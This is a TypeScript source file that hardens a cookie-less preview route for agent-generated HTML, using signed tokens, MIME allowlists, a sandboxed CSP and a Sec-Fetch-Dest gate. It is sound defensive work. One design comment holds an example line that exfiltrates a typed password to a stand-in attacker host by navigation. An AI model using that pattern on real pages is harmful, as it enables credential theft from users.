// SPDX-License-Identifier: Apache-2.0

/**
 * Preview-token + HTML-hardening primitives for the cookie-less document
 * preview route (Phase 4 / D5).
 *
 * Agent-generated HTML is untrusted code that runs in the user's browser. The
 * platform serves it from a hardened, session-less route authorized ONLY by a
 * short-lived signed token carried in the URL — never by a cookie. This module
 * holds the leaf-level primitives (no DB, no HTTP) so they stay unit-testable in
 * isolation:
 *
 *  - {@link signPreviewToken} / {@link verifyPreviewToken} — HMAC capability
 *    tokens authorizing a GET of ONE document's preview for 5 minutes. They are
 *    the shared keyring-HMAC codec (`@appstrate/afps-shared/signed-token`, the
 *    same one behind upload tokens) under the preview domain, and REUSE the
 *    `UPLOAD_SIGNING_SECRET` keyring — no new boot secret. (Trade-off: a
 *    dedicated secret would let the preview capability rotate independently of
 *    upload URLs; reusing the upload secret keeps the OSS boot surface smaller.
 *    The mandatory HMAC domain separator means the two token types can never be
 *    substituted for each other even though they share the key.)
 *  - {@link buildPreviewCsp} — the strict CSP, returned as the TWO copies the
 *    response header and the injected `<meta>` tag each need (they differ by
 *    exactly one directive — see the function).
 *  - {@link injectMetaCsp} — parse-time injection of a duplicate CSP as the first
 *    child of `<head>`, so the policy binds even on the `srcdoc`/relative-URL
 *    paths a header alone can miss.
 */

import { signKeyringToken, verifyKeyringToken } from "@appstrate/afps-shared/signed-token";
import { normalizeMime } from "./mime-policy.ts";

/** Preview capability lifetime — deliberately short (a render link, not a session). */
export const PREVIEW_TOKEN_TTL_SECONDS = 300;

/**
 * Buffer cap for the meta-CSP injection transform. Previews are single-file
 * HTML (OpenAI caps HTML files at 16 MiB); 10 MiB is a generous ceiling that
 * still fits comfortably in memory for the buffer-and-transform injection.
 * A larger document is rejected with 413 rather than streamed unmodified.
 */
export const PREVIEW_MAX_BYTES = 10 * 1024 * 1024;

/**
 * Static HMAC domain separator. Mixed into the signed content so a valid upload
 * token (which shares the `UPLOAD_SIGNING_SECRET` keyring) can never be replayed
 * as a preview token — and, since upload tokens carry their own domain, not the
 * other way round either. The separation is symmetric because the shared codec
 * takes the domain as a required argument, not an optional one.
 */
const PREVIEW_TOKEN_DOMAIN = "doc-preview.v1.";

/** Payload encoded inside a preview token. */
export interface PreviewTokenPayload {
  /** Document id the token authorizes a preview of. */
  d: string;
  /** Org the document belongs to (binds the token to a tenant). */
  o: string;
  /** Expiration unix timestamp (seconds). */
  e: number;
  /**
   * Minting actor's dashboard-user id (null for an end-user actor). Bound so
   * the route can re-check a `user_upload` preview against the document's
   * creator — a foreign upload's hand-crafted token is refused (S1).
   */
  u?: string | null;
  /** Minting actor's end-user id (null for a dashboard-user actor). */
  eu?: string | null;
}

/**
 * Encode + HMAC-sign a preview token with the FIRST key of the keyring, bound
 * to {@link PREVIEW_TOKEN_DOMAIN}.
 */
export function signPreviewToken(
  payload: PreviewTokenPayload,
  secret: string | readonly string[],
): string {
  return signKeyringToken(PREVIEW_TOKEN_DOMAIN, payload, secret);
}

/**
 * Verify + decode a preview token. Returns the payload on success, null on any
 * failure. Verifies against EVERY key of the keyring (constant-time per key) so
 * tokens signed before a rotation stay valid; rejects expired tokens and
 * payloads missing the required fields.
 */
export function verifyPreviewToken(
  token: string,
  secret: string | readonly string[],
): PreviewTokenPayload | null {
  const payload = verifyKeyringToken<PreviewTokenPayload>(PREVIEW_TOKEN_DOMAIN, token, secret);
  if (!payload) return null;
  if (typeof payload.e !== "number" || payload.e < Math.floor(Date.now() / 1000)) return null;
  if (typeof payload.d !== "string" || !payload.d) return null;
  if (typeof payload.o !== "string" || !payload.o) return null;
  return payload;
}

/**
 * Is `mime` an HTML document? Tolerates a parameterized value
 * (`text/html; charset=utf-8`) — only the type/subtype matters for the preview
 * gate. Retained as a focused, tested utility; the DTO and route classify via
 * {@link previewKind} (of which HTML is one kind).
 */
export function isHtmlMime(mime: string): boolean {
  return normalizeMime(mime) === "text/html";
}

/**
 * The four ways a document can be previewed in-browser (or null for "not
 * previewable"). Drives BOTH the DTO's `preview_kind`/`previewable` derivation
 * AND the preview route's serving branch — a single source of truth, so the set
 * of previewable types can never drift between "advertised as previewable" and
 * "actually served".
 */
export type PreviewKind = "html" | "image" | "pdf" | "text";

/**
 * Image mimes served inline, byte-for-byte. Deliberately EXCLUDES
 * `image/svg+xml`: an SVG is ACTIVE content (it can embed `<script>` and event
 * handlers and runs in the embedding context), so it is not inert like a raster
 * image. Routing it safely would mean serving it through the full HTML-style
 * CSP + `sandbox="allow-scripts"` hardening — extra machinery for a rare case —
 * so instead SVG is simply not previewable (still downloadable). See
 * docs/architecture/DOCUMENTS.md → "Preview kinds".
 */
const PREVIEW_IMAGE_MIMES: ReadonlySet<string> = new Set([
  "image/png",
  "image/jpeg",
  "image/gif",
  "image/webp",
]);

/**
 * Text-family mimes previewed as PLAINTEXT. A conservative allowlist, NOT a
 * blanket `text/*`: every entry is inert once the route relabels it
 * `text/plain` (killing any markdown→HTML sniff surface). `application/json` is
 * the common structured-text case; `application/xml` / SVG are excluded (XML can
 * host active content).
 */
const PREVIEW_TEXT_MIMES: ReadonlySet<string> = new Set([
  "text/plain",
  "text/markdown",
  "text/csv",
  "application/json",
]);

/**
 * Classify a document's mime into its {@link PreviewKind}, or null when it is
 * not previewable. Tolerates a parameterized mime (`text/plain; charset=…`) —
 * only the type/subtype is matched.
 */
export function previewKind(mime: string): PreviewKind | null {
  const base = normalizeMime(mime);
  if (base === "text/html") return "html";
  if (base === "application/pdf") return "pdf";
  if (PREVIEW_IMAGE_MIMES.has(base)) return "image";
  if (PREVIEW_TEXT_MIMES.has(base)) return "text";
  return null;
}

/**
 * The CSP for an INERT preview kind (image / pdf / text). These bytes cannot
 * execute in the embedding origin (native raster/PDF viewer, or relabelled
 * plaintext), so the policy is pure belt-and-braces: `default-src 'none'` grants
 * nothing, and `frame-ancestors` pins who may frame the response to the app
 * origin (the PDF path is embedded in an iframe). Distinct from
 * {@link buildPreviewCsp}, which must re-grant inline script/style for the
 * active HTML path.
 */
export function buildInertPreviewCsp(appOrigin: string): string {
  return ["default-src 'none'", `frame-ancestors ${appOrigin}`].join("; ");
}

/**
 * The two copies of the active-HTML preview policy: one for the response header,
 * one for the injected `<meta>` tag. They are NOT interchangeable — see
 * {@link buildPreviewCsp}. Named members (rather than a tuple or a bare string)
 * so a caller cannot silently put the meta copy on the header.
 */
export interface PreviewCsp {
  /** For the `Content-Security-Policy` response header. Carries `sandbox`. */
  header: string;
  /** For {@link injectMetaCsp}. Same policy MINUS the `sandbox` directive. */
  meta: string;
}

/**
 * The strict Content-Security-Policy for the ACTIVE agent-HTML preview response
 * — isolation over sanitization. `default-src 'none'` denies everything, then
 * only the minimum is re-granted: inline scripts/styles (so the agent's page
 * renders), data:/blob: images and media, data: fonts. `connect-src 'none'`
 * kills fetch/XHR/WebSocket/EventSource exfil; `form-action 'none'` kills
 * form-post exfil; `base-uri 'none'` blocks `<base>` hijacking.
 * `frame-ancestors` is pinned to the app origin so only the platform UI may
 * frame the preview (clickjacking / re-embed defense).
 *
 * On top of that, the header copy carries **`sandbox allow-scripts` and nothing
 * else**, which drops the response into an OPAQUE origin. Measured in Chrome
 * against a server sending exactly this header: `window.origin === "null"`,
 * `localStorage` / `sessionStorage` / `document.cookie` throw `SecurityError`,
 * and `window.open` returns null. Tokens deliberately NOT granted:
 *
 *  - `allow-same-origin` — hands the document back a real origin and defeats the
 *    entire control.
 *  - `allow-popups` / `allow-popups-to-escape-sandbox` — a popup would be an
 *    attacker-controlled window opened from a hostname the user trusts.
 *  - `allow-top-navigation` / `allow-top-navigation-by-user-activation` — the
 *    embedded frame must never steer the tab around it, and the "by user
 *    activation" variant is worthless here because the attack IS a click.
 *
 * What the sandbox does NOT buy — measured, not assumed: it does not stop the
 * document navigating ITSELF. The sandboxed-top-level-navigation flags gate
 * navigating an ANCESTOR browsing context only; a sandboxed navigable may always
 * replace its own content, so `location = …`, `<meta http-equiv="refresh">` and
 * a plain `<a href>` click all succeed. That is why a top-level load is never
 * served as active HTML ({@link mayServeActiveHtml}) rather than served under a
 * stricter policy: loaded top-level the agent document IS the navigable, so it
 * can be the fake login form itself and carry the typed-in credentials out in a
 * navigation URL — a channel no CSP directive covers.
 *
 * Where active HTML IS served — a nested frame, the SPA's preview modal — that
 * same self-navigation freedom means the agent document can replace its OWN
 * frame with an arbitrary page. Constraining that needs a `frame-src` directive
 * on the SPA's own response, not something this policy can do. Tracked as a
 * separate gap.
 *
 * The embedding iframe declares the SAME token set (`PREVIEW_IFRAME_SANDBOX` in
 * `apps/web/src/components/document-preview.tsx`) and the two sandboxes
 * INTERSECT, so the sets must move together or not at all. The header copy is
 * not redundant with the attribute: `frame-ancestors` lets ANY page on the app
 * origin frame the preview, so the header is what still applies if a future
 * embedder forgets the attribute.
 *
 * The `<meta>` copy omits `sandbox`, because the directive is IGNORED in a meta
 * context (per spec — a document cannot sandbox itself after parsing has begun).
 * Leaving it there would be dead text that READS like a live control, and the
 * next reader "fixing" the divergence by collapsing the two strings into one
 * would silently disable the header's sandbox. The divergence therefore lives in
 * the return TYPE ({@link PreviewCsp}), not in a comment: the header copy is the
 * meta copy plus the sandbox directive, and every OTHER directive is added to
 * both by construction.
 */
export function buildPreviewCsp(appOrigin: string): PreviewCsp {
  const meta = [
    "default-src 'none'",
    "script-src 'unsafe-inline'",
    "style-src 'unsafe-inline'",
    "img-src data: blob:",
    "media-src data: blob:",
    "font-src data:",
    "connect-src 'none'",
    "form-action 'none'",
    `frame-ancestors ${appOrigin}`,
    "base-uri 'none'",
  ].join("; ");
  return { header: `${meta}; sandbox allow-scripts`, meta };
}

/**
 * Decide whether agent HTML may be served as ACTIVE content for this request
 * (`true` = parse and execute as `text/html` under the hardened CSP; `false` =
 * serve the same bytes relabelled `text/plain`, so the browser shows the source
 * instead of running it).
 *
 * The answer depends on the LOADING CONTEXT and on nothing else. Active HTML
 * requires a proven NESTED-document load (`Sec-Fetch-Dest: iframe`) — in EVERY
 * mode, whether or not `USERCONTENT_URL` is configured. There is no
 * separate-origin escape hatch, because a TOP-LEVEL render of an agent-authored
 * document cannot be contained by anything the response can carry:
 *
 *  - The CSP built by {@link buildPreviewCsp} blocks exfiltration (`connect-src`,
 *    `form-action`, `img-src`, `base-uri`) but NOT script execution itself —
 *    that is by design, the page has to render.
 *  - Its `sandbox allow-scripts` revokes the document's origin, but a sandboxed
 *    navigable may ALWAYS navigate ITSELF (the sandboxed-top-level-navigation
 *    flags only gate navigating an ANCESTOR). Verified in Chrome against a real
 *    server sending that header: on a top-level load `location = …`,
 *    `<meta http-equiv="refresh">` and a plain `<a href>` click all succeed.
 *  - So the attack is not "reach the app's session". It is that the agent
 *    document IS the fake login page, rendered top-level on a hostname the user
 *    trusts, exfiltrating whatever is typed into it BY NAVIGATION
 *    (`location = "https://evil.example/?p=" + password`). No CSP directive
 *    covers that channel. Refusing the render is the only control that does.
 *
 * A separate `USERCONTENT_URL` origin therefore grants no exemption here. It is
 * still worth configuring for a different reason: it gives the preview its own
 * cookie jar, storage partition and process (site isolation), and unlike a CSP
 * it survives a proxy that strips response headers or a UA that ignores
 * `sandbox`. What it cannot do is make a top-level render containable.
 *
 * `Sec-Fetch-Dest` is a browser-set, script-unforgeable header, so it is the
 * authoritative statement of the loading context, and the decision is
 * fail-CLOSED: a top-level navigation (`document`), a bare `fetch` (`empty`),
 * an `object`/`embed` load, and a MISSING header (non-browser client, or a
 * browser too old to send it — Safari < 16.4) all degrade to inert source.
 * Degrading rather than erroring keeps the link useful: the holder of a valid
 * token may read the source, which it could download anyway — the bytes are
 * simply never parsed as a document.
 *
 * @param secFetchDest Raw `Sec-Fetch-Dest` request header, or null when absent.
 */
export function mayServeActiveHtml(secFetchDest: string | null): boolean {
  return secFetchDest === "iframe";
}

/**
 * Inject a `<meta http-equiv="Content-Security-Policy">` duplicating the CSP as
 * the FIRST child of `<head>`. A header alone can be bypassed on some
 * relative-URL / `srcdoc` paths; a parse-time meta CSP binds the policy to the
 * document itself, immovable by script. `frame-ancestors` is silently ignored in
 * a meta context (per spec) — harmless, and the response header still enforces
 * it. Creates a `<head>` (or the whole element) when the document lacks one.
 *
 * Buffer-and-transform (the caller reads the whole body first, bounded by
 * {@link PREVIEW_MAX_BYTES}) — correct and simple, versus fragile regex
 * streaming across chunk boundaries.
 */
export function injectMetaCsp(html: string, csp: string): string {
  // The CSP contains only single quotes, never double — but defend the
  // double-quoted attribute against any exotic origin all the same.
  const meta = `<meta http-equiv="Content-Security-Policy" content="${csp.replace(/"/g, "%22")}">`;

  const headOpen = /<head\b[^>]*>/i.exec(html);
  if (headOpen) {
    const idx = headOpen.index + headOpen[0].length;
    return html.slice(0, idx) + meta + html.slice(idx);
  }

  const htmlOpen = /<html\b[^>]*>/i.exec(html);
  if (htmlOpen) {
    const idx = htmlOpen.index + htmlOpen[0].length;
    return html.slice(0, idx) + `<head>${meta}</head>` + html.slice(idx);
  }

  const doctype = /^\s*<!doctype[^>]*>/i.exec(html);
  if (doctype) {
    const idx = doctype.index + doctype[0].length;
    return html.slice(0, idx) + `<head>${meta}</head>` + html.slice(idx);
  }

  return `<head>${meta}</head>` + html;
}
